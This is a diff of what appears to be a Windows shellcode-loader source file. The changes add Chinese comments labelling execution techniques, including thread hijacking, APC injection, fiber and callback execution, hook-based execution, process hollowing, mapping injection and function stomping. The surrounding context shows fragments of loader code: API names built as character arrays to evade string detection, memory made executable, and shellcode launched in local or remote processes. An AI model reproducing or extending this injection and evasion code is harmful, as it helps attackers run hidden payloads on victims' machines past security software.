@@ -31,6 +31,7 @@ void test() {
 	printf("111");
 }
 
+/*线程劫持相关*/
 void threadHijacking() {
 	int length = sizeof(shellcode);
 
@@ -86,7 +87,6 @@ LPWSTR CharToLPWSTR(const char* charStr) {
 
 	return lpwstr;
 }
-
 void remoteEnum(DWORD targetPid) {
 
 	char str1[] = { 'N','t','W','r','i','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y','\0' };
@@ -133,6 +133,7 @@ void remoteEnum(DWORD targetPid) {
 
 }
 
+/*APC注入相关*/
 void AlertApc() {
 	DWORD dwOldProtection = NULL;
 	LPVOID lpMem = NULL;
@@ -222,6 +223,7 @@ void ntAlertApc() {
 
 }
 
+/*回调函数*/
 void callBackExec() {
 	DWORD dwOldProtection;
 
@@ -233,6 +235,7 @@ void callBackExec() {
 	SymInitialize(GetCurrentProcess(), NULL, true);
 	SymEnumProcesses((PSYM_ENUMPROCESSES_CALLBACK)lpMem, NULL);
 }
+/*纤程*/
 void fiberExec() {
 	DWORD dwOldProtection;
 
@@ -244,6 +247,7 @@ void fiberExec() {
 	LPVOID lpFiber = CreateFiber(sizeof(shellcode), (LPFIBER_START_ROUTINE)lpMem, NULL);
 	SwitchToFiber(lpFiber);
 }
+/*基于HOOK*/
 void hookExec() {
 	DWORD dwOldProtection;
 
@@ -259,6 +263,7 @@ void hookExec() {
 	PeekMessage(&msg, NULL, 0, 0, PM_REMOVE);
 	UnhookWindowsHookEx(hhk);
 }
+/*进程镂空*/
 void hollowingExec() {
 	char str1[] = { 'N','t','U','n','m','a','p','V','i','e','w','O','f','S','e','c','t','i','o','n','\0' };
 	pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(LoadLibraryA("ntdll.dll"), str1);
@@ -339,6 +344,7 @@ void hollowingExec() {
 	ResumeThread(pi.hThread);
 
 }
+/*映射注入*/
 void mappingExec() {
 
 	HANDLE hMapping = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sizeof(shellcode), NULL);
@@ -381,6 +387,7 @@ void mappingEarlyBird() {
 
 
 }
+/*函数踩踏*/
 void localFuncStompingExec() {
 
 	// LPVOID sacrificedAddr = GetProcAddress(LoadLibrary(L"bthprops.cpl"), "BluetoothFindDeviceClose");
